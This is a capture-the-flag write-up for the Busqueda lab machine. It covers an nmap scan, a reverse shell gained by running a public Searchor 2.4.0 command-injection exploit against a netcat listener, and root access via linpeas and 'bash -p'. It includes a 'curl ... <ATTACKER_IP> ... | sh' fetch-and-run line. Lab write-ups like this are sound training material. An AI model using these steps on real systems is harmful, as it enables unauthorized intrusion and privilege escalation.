# Busqueda Writeup
## Recon
A simple search engine. Nothing too interesting in the site itself.

From looking at the source code I found out the website was using a github project called searchor.

I found the following page saying there is an RCE available for version 2.4.0:   
https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection

We will come back to it after a quick NMAP scan.

## NMAP
```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Searcher
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Nothing interesting here either, Looks like the Apache and Werkzeug versions are good.

## Exploitation
Using the exploit I found earlier all we need to do is clone the repository with:
```shell
git clone https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection
```
Then we use netcat to listen on port 9001 which is the default for the exploit:
```shell
nc -lnvp 9001
```
Then we run the exploit using:
```shell
./exploit.sh searcher.com <ATTACKER_IP>
```
We got a shell and we can find the ```user.txt``` file under /home/svc.
## Privilege Escalation
First thing we do is run linpeas on the machine so we open an http server using:
```shell
python3 -m http.server 80
```
Then on the victim machine we use 
```shell
curl -L http://<ATTACKER_IP>/path/to/linpeas.sh | sh
```
We now let linpeas run, and when it finishes we find we have access to /usr/bin/bash so to get root all we have to us run:
```shell
/usr/bin/bash -p
```
And we got root.

Pretty easy machine, nothing to difficult throughout the solve.
